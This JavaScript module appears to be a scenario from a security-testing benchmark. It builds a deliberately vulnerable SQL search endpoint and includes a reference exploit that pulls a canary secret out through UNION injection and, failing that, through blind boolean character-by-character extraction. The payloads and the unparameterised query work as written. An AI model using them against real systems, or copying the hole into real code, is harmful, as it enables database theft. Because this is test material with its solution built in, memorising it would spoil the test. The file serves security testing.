// WSTG-INPV-05 (.2 MySQL / .4 PostgreSQL) — SQL Injection data extraction (polyglot).
// The search runs a string-concatenated query against a real SQL engine (dialect
// per deploy: sqlite / postgres / mysql). A separate vault table holds the canary:
//   T0 -> direct UNION SELECT pulls the vault rows into the rendered results.
//   T1 -> a WAF blocks UNION (incl comment-splitting), so extraction must go
//         blind: a boolean subquery oracle (results-present) recovers the canary
//         character-by-character.
// Columns are fixed: items(id,title,body), vault(id,name,value).

import { makeDb } from '../_shared/sql-dialects.mjs'
import { Scenario } from './scenario.mjs'

let dbPromise = null
function getDb(scenario, canary) {
  if (!dbPromise) dbPromise = (async () => {
    const d = await makeDb(scenario.dialect)
    const esc = s => String(s).replace(/'/g, "''")
    await d.run('DROP TABLE IF EXISTS ' + scenario.itemsTable)
    await d.run('DROP TABLE IF EXISTS ' + scenario.vaultTable)
    await d.run(`CREATE TABLE ${scenario.itemsTable} (id INTEGER, title TEXT, body TEXT)`)
    await d.run(`CREATE TABLE ${scenario.vaultTable} (id INTEGER, name TEXT, value TEXT)`)
    let i = 1
    for (const it of scenario.items) {
      await d.run(`INSERT INTO ${scenario.itemsTable} (id, title, body) VALUES (${i++}, '${esc(it.title)}', '${esc(it.body)}')`)
    }
    let v = 1
    await d.run(`INSERT INTO ${scenario.vaultTable} (id, name, value) VALUES (${v++}, '${esc(scenario.vaultLabel)}', '${esc(canary)}')`)
    for (const s of scenario.vaultDecoys) {
      await d.run(`INSERT INTO ${scenario.vaultTable} (id, name, value) VALUES (${v++}, '${esc(s.name)}', '${esc(s.value)}')`)
    }
    return d
  })()
  return dbPromise
}

export const classDef = {
  wstgId: 'WSTG-INPV-05',
  class: 'SQL Injection (data extraction, polyglot)',
  defenceTiers: [0, 1],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  infraVariant: (s) => s.dialect,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.endpoint.path,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.endpoint.path),

  matchesRequest({ reqUrl, req, scenario }) {
    if (req.method !== (scenario.endpoint.method || 'GET')) return false
    return reqUrl.pathname === scenario.endpoint.path
  },

  async handleRequest({ req, reqUrl, scenario, helpers, renderPage, manifest }) {
    const input = await helpers.extractInput(req, reqUrl, scenario.slots.user_input)
    if (!input || !String(input).trim()) {
      return { status: 200, body: renderPage(scenario.body.replace('{RESULTS}', '<p style="color:#666;padding:24px 0">Enter a search term to begin.</p>')) }
    }
    const d = await getDb(scenario, manifest.perDeployCanary)
    // VULNERABLE: user input concatenated into the WHERE clause (no params).
    const sql = `SELECT id, title, body FROM ${scenario.itemsTable} WHERE body LIKE '%${input}%'`
    let rows
    try { rows = await d.query(sql) }
    catch (e) {
      return { status: 200, body: renderPage(scenario.body.replace('{RESULTS}', `<pre class="db-error" style="color:#b00">${escapeHtml(String(e.message).slice(0, 200))}</pre>`)) }
    }
    return { status: 200, body: renderPage(scenario.body.replace('{RESULTS}', renderRows(rows))) }
  },

  // Reference exploit: try direct UNION (works at T0). If the canary doesn't
  // surface (T1 WAF blocks UNION), fall back to blind boolean extraction using a
  // results-present oracle.
  async fireExploit({ scenario, perDeployCanary, helpers }) {
    const search = async (payload) => {
      const r = await helpers.fireScenarioRequest({ scenario, payload })
      return r.body || ''
    }

    // 1. direct UNION extraction
    const direct = await search(`zzx' UNION SELECT id, name, value FROM ${scenario.vaultTable} -- `)
    if (perDeployCanary && direct.includes(perDeployCanary)) return { status: 200, body: direct }

    // 2. blind boolean extraction — results-present oracle. A false condition
    // matches ~nothing; a true condition floods all items into the results.
    const falseCount = countCards(await search(`zzx' OR '1'='2' -- `))
    const trueCount = countCards(await search(`zzx' OR '1'='1' -- `))
    if (trueCount <= falseCount) return { status: 200, body: '(blind oracle unavailable)' }
    const oracle = async (expr) => countCards(await search(`zzx' OR ${expr} -- `)) >= trueCount

    const sub = `(SELECT value FROM ${scenario.vaultTable} WHERE name='${scenario.vaultLabel}' LIMIT 1)`
    const charset = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
    let secret = ''
    for (let pos = 1; pos <= 64; pos++) {
      const hits = await Promise.all([...charset].map(async (c) =>
        (await oracle(`substr(${sub},${pos},1)='${c}'`)) ? c : null))
      const c = hits.find(Boolean)
      if (!c) break
      secret += c
    }
    return { status: 200, body: secret }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

// Exposed for the in-process self-test.
export const __test = { getDb, resetDb: () => { dbPromise = null }, countCards }

function countCards(html) {
  return (String(html).match(/result-card/g) || []).length
}
function renderRows(rows) {
  if (!rows.length) return '<p style="color:#666;padding:24px 0">No matching results.</p>'
  return '<div style="display:grid;gap:12px;padding:16px 0">' + rows.map(r =>
    `<article class="result-card" style="border:1px solid #e5e5e5;border-radius:8px;padding:16px;background:#fafafa">
      <div style="font-weight:600">${escapeHtml(r.title)}</div>
      <div style="font-size:14px;margin-top:4px">${escapeHtml(r.body)}</div>
    </article>`).join('') + '</div>'
}
function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
